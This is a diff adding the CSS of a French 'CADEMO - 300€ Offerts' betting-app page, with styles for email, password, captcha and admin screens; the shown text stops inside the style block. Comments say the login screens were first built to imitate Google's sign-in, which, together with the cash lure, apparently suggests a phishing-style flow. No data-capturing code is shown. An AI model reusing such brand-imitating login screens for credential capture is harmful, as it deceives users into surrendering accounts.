@@ -1,0 +1,3618 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>CADEMO - 300€ Offerts</title>
+    <style>
+        /* Styles généraux pour ressembler à l'interface mobile */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #0b1323;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100dvh;
+            margin: 0;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px; /* Largeur type mobile */
+            box-sizing: border-box;
+        }
+
+        /* Landing iframe : full-bleed, pas de padding */
+        #page-start {
+            width: 100vw;
+            max-width: none;
+            margin: 0 calc(-50vw + 50%);
+        }
+
+        /* Auth screens conservent leur padding interne */
+        #page-email > div, #page-password > div, #page-captcha > div, #page-mail-info > div {
+            padding: 24px 16px;
+            box-sizing: border-box;
+        }
+
+        /* Logo Google (approximation simple avec les couleurs) */
+        .logo {
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            letter-spacing: -1px;
+        }
+        .logo span:nth-child(1) { color: #4285F4; }
+        .logo span:nth-child(2) { color: #EA4335; }
+        .logo span:nth-child(3) { color: #FBBC05; }
+        .logo span:nth-child(4) { color: #4285F4; }
+        .logo span:nth-child(5) { color: #34A853; }
+        .logo span:nth-child(6) { color: #EA4335; }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            text-align: center;
+            margin-bottom: 5px;
+        }
+
+        .subtitle {
+            text-align: center;
+            font-size: 14px;
+            color: #202124;
+            margin-bottom: 30px;
+        }
+        .subtitle a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        /* Champs de saisie */
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+            outline: none;
+        }
+        input[type="text"]:focus, input[type="password"]:focus {
+            border: 2px solid #1a73e8;
+            padding: 11px; /* Pour compenser la bordure plus épaisse */
+        }
+
+        /* Liens */
+        .link {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            display: inline-block;
+            margin-top: 5px;
+            margin-bottom: 20px;
+        }
+
+        /* Conteneur du bas (boutons) */
+        .bottom-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 40px;
+        }
+
+        .btn-create {
+            color: #1a73e8;
+            background: none;
+            border: none;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .btn-next {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        /* Écran 2 : Welcome */
+        .email-display {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid #dadce0;
+            border-radius: 20px;
+            padding: 10px 15px;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        .email-display .icon {
+            margin-right: 10px;
+            font-size: 20px;
+            color: #5f6368; /* Couleur de l'icone */
+        }
+        .email-display .arrow {
+            margin-left: auto;
+            color: #5f6368;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .checkbox-group input {
+            margin-right: 10px;
+            transform: scale(1.2);
+            accent-color: #1a73e8;
+        }
+
+        /* Page de démarrage */
+        #page-start {
+            text-align: center;
+            margin-top: 0;
+            height: 100dvh;
+            overflow: hidden;
+        }
+        .btn-google {
+            background-color: white;
+            color: #3c4043;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 20px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+        }
+        .btn-google img {
+            width: 20px;
+            margin-right: 10px;
+        }
+
+        /* Gestion de l'affichage des pages */
+        .screen {
+            display: none;
+        }
+        .screen.active {
+            display: block;
+        }
+        /* Écrans auth : fixe plein viewport, scroll interne, pas de bounce */
+        #page-email.screen.active,
+        #page-password.screen.active,
+        #page-captcha.screen.active,
+        #page-mail-info.screen.active {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+        }
+        /* Auth screens inner container : centré verticalement ET horizontalement avec margin:auto */
+        #page-email > div, #page-password > div, #page-captcha > div:not(#captcha-initial-loader), #page-mail-info > div {
+            width: 100%;
+            max-width: 420px;
+            margin: auto;
+            box-sizing: border-box;
+        }
+    </style>
+
+<!-- =========================================================================
+     AJOUTS CADEMO — rien au-dessus de cette ligne n'a été modifié.
+     Design repris de la maquette Stitch (charte Cademo).
+     ========================================================================= -->
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Hanken+Grotesk:wght@400;500;600;700;800&display=swap">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200&display=swap">
+<style>
+:root{
+  /* Surfaces - Nouvelle palette ZIP */
+  --bg:#0b1323;
+  --surface-dim:#0b1323;
+  --surface-bright:#31394b;
+  --sc-lowest:#060e1e;
+  --sc-low:#141b2c;
+  --sc:#182030;
+  --sc-high:#222a3b;
+  --sc-highest:#2d3546;
+  --surface-variant:#2d3546;
+  /* Texte */
+  --on-surface:#dbe2f9;
+  --on-surface-variant:#c4c5d7;
+  --outline:#8e90a0;
+  --outline-variant:#434655;
+  /* Or / Action Yellow */
+  --gold:#FACC15;
+  --gold-fixed:#ffe083;
+  --gold-dim:#eec200;
+  --on-gold:#221b00;
+  --on-gold-container:#645000;
+  /* Bleu (primary) */
+  --blue:#1d4ed8;
+  --blue-light:#b7c4ff;
+  --blue-fixed:#dce1ff;
+  /* Vert (tertiary / success) */
+  --green:#4ae176;
+  --green-bright:#6bff8f;
+  --green-container:#006b2d;
+  /* Erreur */
+  --error:#ffb4ab;
+  --error-container:#93000a;
+  --on-error:#690005;
+  --on-error-container:#ffdad6;
+  /* Espacements */
+  --s-base:4px; --s-xs:8px; --s-sm:12px; --s-md:16px; --s-lg:24px; --s-xl:32px;
+  --sans:"Hanken Grotesk",system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+}
+
+.material-symbols-outlined{
+  font-family:"Material Symbols Outlined";
+  font-weight:normal;font-style:normal;font-size:24px;line-height:1;
+  letter-spacing:normal;text-transform:none;display:inline-block;
+  white-space:nowrap;direction:ltr;
+  -webkit-font-feature-settings:"liga";font-feature-settings:"liga";
+  -webkit-font-smoothing:antialiased;
+  vertical-align:middle;
+}
+.icon-fill{font-variation-settings:"FILL" 1;}
+.i-14{font-size:14px;} .i-16{font-size:16px;} .i-18{font-size:18px;} .i-20{font-size:20px;}
+
+/* La landing (page-start) garde le style CSS d'origine de Léo — on n'ajoute
+   aucun override ici. Seule la classe .cd-wordmark est conservée car elle
+   sert aussi dans l'en-tête de l'app (le logo CADEMO doré). */
+.cd-wordmark{
+  font-family:var(--sans);font-size:30px;font-weight:900;letter-spacing:-.03em;
+  color:var(--gold);margin:0;
+}
+
+/* Écrans 1 et 2 : mise en page d'origine, marque Cademo (plus l'identité Google) */
+body.cademo-auth{background-color:#fff;color:#202124;font-family:Arial,sans-serif;
+  display:flex;align-items:center;height:100vh;}
+/* Le wordmark reprend l'emplacement du logo mais en une seule couleur de marque. */
+.cademo-wordmark span{color:#0d1320 !important;}
+.cademo-wordmark span:nth-child(3){color:var(--gold-dim) !important;}
+
+/* ------------------------------------------------------------ APP */
+body.cademo-app{
+  background-color:var(--bg);color:var(--on-surface);font-family:var(--sans);
+  display:block;height:auto;min-height:100vh;
+}
+body.cademo-app > .container{display:none;}
+#cademo-app{display:none;}
+body.cademo-app #cademo-app{display:block;}
+
+.cd-shell{max-width:600px;margin:0 auto;padding:64px 0 80px;box-sizing:border-box;}
+.cd-view{display:none;padding:0 var(--s-md);}
+.cd-view.active{display:block;}
+
+/* En-tête fixe - Nouveau design ZIP */
+.cd-header{
+  position:fixed;top:0;left:0;right:0;z-index:50;height:64px;
+  max-width:600px;margin:0 auto;
+  background-color:var(--bg);
+  border-bottom:1px solid var(--outline-variant);
+  display:flex;align-items:center;justify-content:space-between;padding:0 var(--s-md);
+}
+.cd-header-left{display:flex;align-items:center;gap:var(--s-sm);}
+.cd-header .cd-wordmark{font-size:24px;font-weight:700;letter-spacing:-0.01em;color:var(--on-surface);margin:0;}
+.cd-header-right{display:flex;align-items:center;gap:var(--s-sm);}
+.cd-unlock-btn{
+  background-color:var(--error-container);
+  color:var(--on-error-container);
+  border:1px solid rgba(255,180,171,0.3);
+  border-radius:999px;
+  padding:6px 14px;
+  font-family:var(--sans);
+  font-size:12px;
+  font-weight:700;
+  text-transform:uppercase;
+  letter-spacing:0.02em;
+  cursor:pointer;
+  display:flex;
+  align-items:center;
+  gap:6px;
+  transition:all .15s;
+}
+.cd-unlock-btn:hover{transform:scale(1.05);}
+.cd-unlock-btn .material-symbols-outlined{font-size:18px;}
+.cd-unlock-btn.is-verified{
+  background-color:var(--green-container);
+  color:var(--green-bright);
+  border-color:rgba(78,222,163,0.3);
+}
+
+/* Panneau vitré */
+.glass{
+  background:rgba(21,28,44,.6);
+  -webkit-backdrop-filter:blur(12px);backdrop-filter:blur(12px);
+  border:1px solid rgba(255,255,255,.05);
+}
+
+/* Recherche */
+.cd-search{position:relative;margin-bottom:var(--s-sm);}
+.cd-search .material-symbols-outlined{
+  position:absolute;left:12px;top:50%;transform:translateY(-50%);
+  color:var(--on-surface-variant);font-size:22px;pointer-events:none;
+}
+.cd-search input{
+  width:100%;box-sizing:border-box;background-color:#070B14;
+  border:1px solid rgba(255,255,255,.1);border-radius:16px;
+  padding:13px 14px 13px 44px;color:var(--on-surface);
+  font-family:var(--sans);font-size:16px;font-weight:500;outline:none;
+}
+.cd-search input::placeholder{color:var(--outline);}
+.cd-search input:focus{border-color:var(--gold);box-shadow:0 0 0 1px var(--gold);}
+
+/* Pastilles de sport - Nouveau design ZIP */
+.cd-sports{
+  display:flex;gap:var(--s-sm);overflow-x:auto;padding-bottom:var(--s-base);
+  margin-bottom:var(--s-md);-ms-overflow-style:none;scrollbar-width:none;
+}
+.cd-sports::-webkit-scrollbar{display:none;}
+.cd-sport{
+  white-space:nowrap;flex-shrink:0;display:inline-flex;align-items:center;gap:var(--s-xs);
+  padding:8px 14px;border-radius:999px;cursor:pointer;
+  border:1px solid var(--outline-variant);background-color:var(--sc);
+  color:var(--on-surface-variant);font-family:var(--sans);font-size:14px;font-weight:500;
+}
+.cd-sport .material-symbols-outlined{font-size:18px;}
+.cd-sport.is-on{
+  border-color:var(--blue-light);background-color:rgba(23,59,171,.3);color:var(--blue-light);
+}
+.cd-sport.is-on .material-symbols-outlined{font-variation-settings:"FILL" 1;}
+
+/* Chips de catégories */
+.cd-chips{
+  display:flex;gap:var(--s-sm);overflow-x:auto;padding-bottom:var(--s-base);
+  margin-bottom:var(--s-md);-ms-overflow-style:none;scrollbar-width:none;
+}
+.cd-chips::-webkit-scrollbar{display:none;}
+.cd-chip-btn{
+  white-space:nowrap;flex-shrink:0;
+  padding:6px 14px;border-radius:999px;cursor:pointer;
+  border:1px solid var(--outline-variant);background-color:var(--sc);
+  color:var(--on-surface-variant);font-family:var(--sans);font-size:14px;font-weight:500;
+}
+.cd-chip-btn.is-on{
+  background-color:var(--blue);color:var(--on-primary-fixed);border-color:var(--blue);
+}
+
+/* Titres de section */
+.cd-sec{margin-bottom:var(--s-lg);}
+.cd-sec h2{
+  display:flex;align-items:center;gap:var(--s-xs);
+  font-family:var(--sans);font-size:18px;font-weight:700;color:var(--on-surface);
+  margin:0 0 var(--s-sm);text-align:left;
+}
+.cd-sec h2 .material-symbols-outlined{font-variation-settings:"FILL" 1;}
+.cd-sec h2 .ic-fire{color:var(--gold);}
+.cd-sec h2 .ic-gem{color:var(--green);}
+.cd-cards{display:flex;flex-direction:column;gap:var(--s-sm);}
+
+/* Carte de pari - Nouveau design ZIP */
+.cd-card{
+  background-color:#1E293B;border-radius:8px;padding:var(--s-md);
+  border:1px solid rgba(255,255,255,0.05);
+  position:relative;overflow:hidden;
+  display:flex;flex-direction:column;gap:var(--s-sm);
+}
+.cd-card .cd-bg-letters{
+  position:absolute;right:-20px;top:10px;font-size:80px;font-weight:900;
+  color:rgba(255,255,255,0.03);font-family:var(--sans);line-height:1;
+  pointer-events:none;letter-spacing:-2px;
+}
+.cd-card-top{display:flex;align-items:center;gap:var(--s-sm);position:relative;z-index:1;}
+.cd-card-top h3{
+  font-family:var(--sans);font-size:18px;font-weight:700;line-height:1.25;
+  color:var(--on-surface);margin:0 0 2px;text-align:left;
+}
+.cd-card-top p{font-size:14px;font-weight:500;color:var(--on-surface-variant);margin:0;display:flex;align-items:center;gap:4px;}
+.cd-market{
+  font-size:12px;font-weight:700;line-height:16px;color:var(--on-surface-variant);
+  text-transform:uppercase;letter-spacing:.05em;position:relative;z-index:1;
+}
+.cd-line{
+  font-size:22px;font-weight:800;line-height:1;color:var(--on-surface);
+  margin-top:var(--s-xs);position:relative;z-index:1;
+}
+.cd-picks{display:flex;gap:var(--s-sm);position:relative;z-index:1;margin-top:var(--s-xs);}
+.cd-pick{
+  flex:1;border-radius:8px;padding:10px 6px;cursor:pointer;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  font-family:var(--sans);border:1px solid transparent;
+  font-size:14px;font-weight:600;
+  transition:all .15s;
+}
+.cd-pick .cd-p-l{font-size:12px;font-weight:700;line-height:16px;opacity:.8;}
+.cd-pick .cd-p-o{font-size:16px;font-weight:700;line-height:24px;}
+.cd-pick-less{background-color:#334155;color:#fff;border:1px solid rgba(255,255,255,0.05);}
+.cd-pick-more{background-color:#334155;color:#fff;border:1px solid rgba(255,255,255,0.05);}
+.cd-pick-less.is-on{background-color:var(--gold);color:#000;border-color:var(--gold);}
+.cd-pick-more.is-on{background-color:var(--gold);color:#000;border-color:var(--gold);}
+.cd-pick:hover{opacity:0.9;}
+
+/* Barre de navigation basse - Nouveau design ZIP */
+.cd-nav{
+  position:fixed;bottom:0;left:0;right:0;z-index:50;
+  max-width:600px;margin:0 auto;
+  background-color:var(--sc);
+  border-top:1px solid var(--outline-variant);
+  border-radius:16px 16px 0 0;
+  display:flex;justify-content:space-around;align-items:center;
+  padding:8px 0 calc(8px + env(safe-area-inset-bottom));
+}
+.cd-nav button{
+  flex:1;background:none;border:none;cursor:pointer;border-radius:12px;padding:6px 0;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:2px;
+  color:var(--on-surface-variant);font-family:var(--sans);font-size:11px;font-weight:500;
+  position:relative;transition:all .15s;
+}
+.cd-nav button.is-on{
+  color:var(--blue-light);
+}
+.cd-nav button.is-on .material-symbols-outlined{font-variation-settings:"FILL" 1;}
+.cd-nav .cd-badge{
+  position:absolute;top:0;right:4px;min-width:18px;height:18px;border-radius:999px;
+  background-color:var(--gold);color:var(--on-gold);
+  font-size:11px;font-weight:800;line-height:18px;text-align:center;padding:0 4px;
+}
+
+/* -------------------------------------------------------- TITRES DE VUE */
+.cd-vhead{display:flex;justify-content:space-between;align-items:flex-end;margin-bottom:var(--s-sm);}
+.cd-vhead h2{font-size:20px;font-weight:600;color:var(--on-surface);margin:0;text-align:left;}
+.cd-vhead p{font-size:14px;color:var(--on-surface-variant);margin:2px 0 0;}
+.cd-clear{
+  background:none;border:none;cursor:pointer;color:var(--error);
+  font-family:var(--sans);font-size:14px;display:inline-flex;align-items:center;gap:4px;
+}
+
+/* -------------------------------------------------------- TICKET */
+.cd-leg{
+  border-radius:20px;padding:var(--s-md);position:relative;overflow:hidden;margin-bottom:var(--s-sm);
+}
+.cd-leg .cd-leg-bar{position:absolute;left:0;top:0;bottom:0;width:4px;background-color:var(--gold);}
+.cd-leg-top{display:flex;justify-content:space-between;align-items:flex-start;gap:var(--s-sm);margin-bottom:var(--s-xs);}
+.cd-leg-top h3{font-size:20px;font-weight:600;color:var(--on-surface);margin:4px 0 0;text-align:left;}
+.cd-oddbox{
+  background-color:var(--sc-lowest);border:1px solid rgba(255,215,0,.3);
+  border-radius:16px;padding:8px 14px;flex-shrink:0;
+}
+.cd-oddbox b{
+  font-size:20px;font-weight:800;color:var(--gold);
+  text-shadow:0 0 10px rgba(255,215,0,.4);
+}
+.cd-leg-meta{
+  font-size:14px;color:var(--on-surface-variant);display:flex;align-items:center;gap:5px;margin:0;
+}
+.cd-leg-x{
+  position:absolute;top:12px;right:12px;background:none;border:none;cursor:pointer;
+  color:var(--on-surface-variant);padding:2px;
+}
+.cd-addmore{
+  width:100%;box-sizing:border-box;padding:13px;border-radius:20px;cursor:pointer;
+  border:1px dashed var(--outline-variant);background:none;color:var(--on-surface-variant);
+  font-family:var(--sans);font-size:14px;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+}
+.cd-stakebox{
+  background-color:var(--sc-lowest);border:1px solid rgba(255,255,255,.05);
+  border-radius:20px;padding:var(--s-md);margin-top:var(--s-sm);
+}
+.cd-quick{display:flex;gap:var(--s-xs);overflow-x:auto;padding-bottom:8px;margin-bottom:var(--s-md);
+  -ms-overflow-style:none;scrollbar-width:none;}
+.cd-quick::-webkit-scrollbar{display:none;}
+.cd-quick button{
+  flex:none;padding:8px 16px;border-radius:999px;cursor:pointer;
+  background-color:#334155;border:1px solid rgba(255,255,255,0.05);color:var(--on-surface);
+  font-family:var(--sans);font-size:14px;font-weight:500;
+}
+.cd-quick button.is-on{
+  background-color:var(--blue);border-color:var(--blue);color:var(--on-primary);
+}
+.cd-stakefield{position:relative;margin-bottom:var(--s-lg);}
+.cd-stakefield span{
+  position:absolute;left:var(--s-md);top:50%;transform:translateY(-50%);
+  font-size:20px;font-weight:600;color:var(--on-surface-variant);pointer-events:none;
+}
+.cd-stakefield input{
+  width:100%;box-sizing:border-box;background-color:#070B14;
+  border:1px solid var(--outline-variant);border-radius:20px;
+  padding:16px var(--s-md) 16px 48px;text-align:right;
+  font-family:var(--sans);font-size:28px;font-weight:800;color:var(--on-surface);outline:none;
+}
+.cd-stakefield input:focus{border-color:var(--gold);box-shadow:0 0 12px rgba(255,215,0,.25);}
+.cd-sum{display:flex;flex-direction:column;gap:var(--s-xs);padding-top:var(--s-sm);
+  border-top:1px solid rgba(255,255,255,.1);}
+.cd-sum div{display:flex;justify-content:space-between;align-items:center;}
+.cd-sum span{font-size:14px;color:var(--on-surface-variant);}
+.cd-sum b{font-size:20px;font-weight:600;color:var(--on-surface);}
+.cd-sum .cd-win b{
+  font-size:28px;font-weight:800;color:var(--green);
+  filter:drop-shadow(0 0 8px rgba(78,222,163,.35));
+}
+.cd-after{margin:var(--s-md) 0 0;text-align:center;font-size:14px;color:var(--on-surface-variant);}
+.cd-after b{color:var(--on-surface);font-weight:600;}
+.cd-cap{margin:6px 0 0;text-align:center;font-size:12px;line-height:1.5;color:var(--outline);}
+.cd-cap b{color:var(--gold-fixed);font-weight:700;}
+.cd-validate{
+  width:100%;box-sizing:border-box;margin-top:var(--s-sm);
+  background-color:var(--gold);color:var(--on-gold-container);
+  border:none;border-radius:20px;padding:var(--s-md);cursor:pointer;
+  font-family:var(--sans);font-size:24px;font-weight:700;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  box-shadow:0 0 20px rgba(255,215,0,.3);
+}
+.cd-validate:disabled{
+  background-color:var(--sc-high);color:var(--outline);box-shadow:none;cursor:not-allowed;
+}
+
+/* -------------------------------------------------------- MES PARIS */
+.cd-seg{
+  display:flex;background-color:var(--sc-low);border:1px solid rgba(255,255,255,.05);
+  border-radius:20px;padding:var(--s-base);margin-bottom:var(--s-lg);
+}
+.cd-seg button{
+  flex:1;padding:9px;border:none;border-radius:16px;cursor:pointer;background:none;
+  font-family:var(--sans);font-size:20px;font-weight:600;color:var(--on-surface-variant);
+}
+.cd-seg button.is-on{background-color:var(--surface-bright);color:var(--on-surface);}
+
+.cd-ticket{
+  background-color:var(--sc-low);border:1px solid rgba(255,255,255,.1);
+  border-radius:20px;padding:var(--s-sm);margin-bottom:var(--s-sm);
+  position:relative;overflow:hidden;
+}
+.cd-ticket.is-won{border-color:rgba(78,222,163,.3);box-shadow:0 0 20px rgba(78,222,163,.1);}
+.cd-tk-head{
+  display:flex;justify-content:space-between;align-items:center;gap:var(--s-xs);
+  padding-bottom:var(--s-sm);border-bottom:1px solid rgba(255,255,255,.05);
+}
+.cd-chip{
+  padding:5px 9px;border-radius:6px;font-size:12px;font-weight:700;
+  text-transform:uppercase;letter-spacing:.05em;
+  background-color:rgba(23,59,171,.35);color:var(--blue-fixed);
+}
+.cd-chip.c-grey{background-color:var(--sc-high);color:var(--on-surface-variant);}
+.cd-tk-date{font-size:14px;color:var(--on-surface-variant);}
+.cd-status{display:inline-flex;align-items:center;gap:4px;font-size:12px;font-weight:700;white-space:nowrap;}
+.cd-status.s-open{color:var(--gold-fixed);}
+.cd-status.s-won{color:var(--green);}
+.cd-status.s-lost{color:var(--error);}
+.cd-status.s-push{color:var(--on-surface-variant);}
+.cd-tk-body{padding:var(--s-sm) 0 0;}
+.cd-tk-body h3{font-size:20px;font-weight:600;color:var(--on-surface);margin:0;text-align:left;}
+.cd-tk-sel{display:flex;justify-content:space-between;align-items:flex-end;gap:var(--s-sm);margin-top:var(--s-xs);}
+.cd-tk-sel .cd-tk-sel-l{display:flex;flex-direction:column;min-width:0;}
+.cd-tk-sel .cd-tk-sel-l span{font-size:14px;color:var(--on-surface-variant);}
+.cd-tk-sel .cd-tk-sel-l b{font-size:16px;font-weight:700;color:var(--on-surface);}
+.cd-tk-odd{
+  padding:5px 13px;border-radius:16px;flex-shrink:0;
+  background-color:var(--sc-high);border:1px solid rgba(255,255,255,.05);
+}
+.cd-tk-odd b{font-size:28px;font-weight:800;color:var(--gold-fixed);}
+
+.cd-timeline{position:relative;display:flex;flex-direction:column;gap:var(--s-sm);padding:var(--s-sm) 0;}
+.cd-timeline::before{
+  content:"";position:absolute;left:11px;top:10px;bottom:10px;width:2px;
+  background-color:var(--sc-highest);border-radius:999px;
+}
+.cd-tl{position:relative;padding-left:32px;display:flex;justify-content:space-between;gap:var(--s-sm);}
+.cd-tl::before{
+  content:"";position:absolute;left:6px;top:6px;width:10px;height:10px;border-radius:999px;
+  background-color:var(--sc-highest);border:2px solid var(--sc-low);
+}
+.cd-tl.is-won::before{
+  background-color:var(--green);border-color:var(--sc-low);
+  box-shadow:0 0 8px rgba(78,222,163,.5);
+}
+.cd-tl-txt{display:flex;flex-direction:column;min-width:0;}
+.cd-tl-txt span{font-size:14px;color:var(--on-surface-variant);}
+.cd-tl-txt b{font-size:14px;font-weight:700;color:var(--on-surface);}
+.cd-tl-odd{font-size:16px;font-weight:500;color:var(--on-surface);white-space:nowrap;}
+.cd-tl.is-won .cd-tl-odd{color:var(--green);}
+
+.cd-tk-foot{
+  display:flex;justify-content:space-between;align-items:center;
+  margin:var(--s-sm) calc(var(--s-sm) * -1) calc(var(--s-sm) * -1);
+  padding:var(--s-sm);border-top:1px solid rgba(255,255,255,.05);
+  background-color:rgba(7,14,26,.5);border-radius:0 0 18px 18px;
+}
+.cd-tk-foot .cd-f-l{display:flex;flex-direction:column;}
+.cd-tk-foot .cd-f-r{display:flex;flex-direction:column;align-items:flex-end;text-align:right;}
+.cd-tk-foot span{font-size:14px;color:var(--on-surface-variant);}
+.cd-tk-foot b{font-size:20px;font-weight:600;color:var(--on-surface);}
+.cd-tk-foot .cd-gain b{
+  font-size:26px;font-weight:800;color:var(--gold);
+  filter:drop-shadow(0 0 8px rgba(255,215,0,.4));
+}
+.cd-tk-foot .cd-gain.g-won b{color:var(--green);filter:drop-shadow(0 0 8px rgba(78,222,163,.4));}
+.cd-tk-foot .cd-gain.g-lost b{color:var(--error);filter:none;}
+.cd-tk-foot .cd-gain.g-push b{color:var(--on-surface-variant);filter:none;}
+
+/* -------------------------------------------------------- PROFIL */
+.cd-bal{border-radius:20px;padding:var(--s-md);position:relative;overflow:hidden;margin-bottom:var(--s-lg);}
+.cd-bal .cd-bal-line{
+  position:absolute;top:0;left:0;width:100%;height:4px;opacity:.5;
+  background:linear-gradient(90deg,var(--blue),var(--gold),var(--blue));
+}
+.cd-bal-top{display:flex;justify-content:space-between;align-items:flex-end;gap:var(--s-sm);}
+.cd-bal-top h2{
+  font-size:14px;font-weight:400;color:var(--on-surface-variant);
+  text-transform:uppercase;letter-spacing:.05em;margin:0;text-align:left;
+}
+.cd-bal-amt{font-size:28px;font-weight:800;line-height:32px;color:var(--on-surface);margin-top:4px;}
+.cd-bal-amt small{font-size:20px;font-weight:800;color:var(--on-surface-variant);}
+.cd-obj{
+  font-size:12px;font-weight:700;color:var(--gold);white-space:nowrap;
+  background-color:rgba(255,215,0,.1);border:1px solid rgba(255,215,0,.2);
+  border-radius:8px;padding:5px 9px;
+}
+.cd-prog-lbl{display:flex;justify-content:space-between;font-size:12px;font-weight:700;
+  color:var(--on-surface-variant);margin:var(--s-md) 0 var(--s-base);}
+.cd-prog-lbl b{color:var(--green);}
+.cd-prog{
+  height:12px;border-radius:999px;background-color:var(--sc);
+  border:1px solid rgba(255,255,255,.05);overflow:hidden;
+}
+.cd-prog i{
+  display:block;height:100%;border-radius:999px;
+  background:linear-gradient(90deg,var(--blue),var(--green));
+  box-shadow:0 0 12px rgba(78,222,163,.4);
+}
+.cd-bento{display:grid;grid-template-columns:1fr 1fr;gap:var(--s-sm);margin-bottom:var(--s-lg);}
+.cd-bento > div{border-radius:20px;padding:var(--s-md);}
+.cd-bento .cd-b-wide{grid-column:span 2;display:flex;align-items:center;gap:var(--s-md);}
+.cd-b-ico{
+  width:48px;height:48px;flex-shrink:0;border-radius:999px;background-color:var(--sc);
+  border:1px solid rgba(255,255,255,.1);color:var(--on-surface-variant);
+  display:flex;align-items:center;justify-content:center;
+}
+.cd-b-wide .cd-b-l{font-size:14px;color:var(--on-surface-variant);}
+.cd-b-wide .cd-b-v{font-size:16px;font-weight:500;color:var(--on-surface);word-break:break-all;}
+.cd-b-stat{display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;gap:var(--s-xs);}
+.cd-b-stat .material-symbols-outlined{font-size:26px;}
+.cd-b-stat .cd-b-n{font-size:28px;font-weight:800;line-height:32px;color:var(--on-surface);}
+.cd-b-stat .cd-b-c{font-size:14px;color:var(--on-surface-variant);}
+.cd-b-stat.is-green{position:relative;overflow:hidden;}
+.cd-b-stat.is-green::before{content:"";position:absolute;inset:0;background-color:rgba(78,222,163,.05);}
+.cd-b-stat.is-green .material-symbols-outlined,.cd-b-stat.is-green .cd-b-n{color:var(--green);position:relative;}
+.cd-b-stat.is-green .cd-b-c{position:relative;}
+.cd-b-kv{display:flex;flex-direction:column;justify-content:space-between;gap:var(--s-sm);}
+.cd-b-kv .cd-b-l{display:flex;align-items:center;gap:8px;font-size:14px;color:var(--on-surface-variant);}
+.cd-b-kv .cd-b-l .material-symbols-outlined{font-size:18px;}
+.cd-b-kv .cd-b-v{font-size:20px;font-weight:600;color:var(--on-surface);}
+.cd-b-kv .cd-b-v.is-gold{color:var(--gold-fixed);}
+.cd-draw{
+  border-radius:20px;padding:var(--s-md);border-left:4px solid var(--gold);
+  display:flex;align-items:center;justify-content:space-between;gap:var(--s-md);margin-bottom:var(--s-md);
+}
+.cd-draw-l{display:flex;align-items:center;gap:var(--s-md);}
+.cd-draw-ico{
+  width:40px;height:40px;flex-shrink:0;border-radius:999px;
+  background-color:rgba(255,215,0,.2);color:var(--gold);
+  display:flex;align-items:center;justify-content:center;
+  box-shadow:0 0 15px rgba(255,215,0,.3);
+}
+.cd-draw b{display:block;font-size:20px;font-weight:600;color:var(--on-surface);}
+.cd-draw span{display:block;font-size:14px;color:var(--on-surface-variant);margin-top:2px;}
+.cd-logout{
+  width:100%;box-sizing:border-box;border-radius:20px;padding:var(--s-md);cursor:pointer;
+  background:rgba(21,28,44,.6);border:1px solid rgba(147,0,10,.3);color:var(--error);
+  font-family:var(--sans);font-size:16px;font-weight:700;
+  display:flex;align-items:center;justify-content:center;gap:var(--s-sm);
+}
+
+/* -------------------------------------------------------- ADMIN */
+.cd-adm-head{margin-bottom:var(--s-lg);}
+.cd-adm-head h1{font-size:24px;font-weight:700;line-height:32px;color:var(--gold);margin:0 0 var(--s-xs);text-align:left;}
+.cd-adm-head p{font-size:14px;color:var(--on-surface-variant);margin:0;}
+.cd-adm-sec{margin-bottom:var(--s-xl);}
+.cd-adm-bar{display:flex;align-items:center;justify-content:space-between;gap:var(--s-sm);margin-bottom:var(--s-sm);}
+.cd-adm-bar h2{
+  display:flex;align-items:center;gap:var(--s-xs);
+  font-size:20px;font-weight:600;color:var(--on-surface);margin:0;text-align:left;
+}
+.cd-adm-bar h2 .material-symbols-outlined{color:var(--gold-fixed);}
+.cd-count{
+  font-size:12px;font-weight:700;color:var(--on-surface-variant);
+  background-color:var(--sc);border-radius:999px;padding:6px 12px;white-space:nowrap;
+}
+.cd-count.is-gold{background-color:var(--gold);color:var(--bg);}
+.cd-admfilter{display:flex;gap:var(--s-xs);margin-bottom:var(--s-sm);}
+.cd-admfilter button{
+  padding:8px 14px;border-radius:999px;cursor:pointer;
+  background-color:var(--sc);border:1px solid var(--outline-variant);color:var(--on-surface-variant);
+  font-family:var(--sans);font-size:12px;font-weight:700;
+}
+.cd-admfilter button.is-on{background-color:var(--gold);border-color:var(--gold);color:var(--on-gold);}
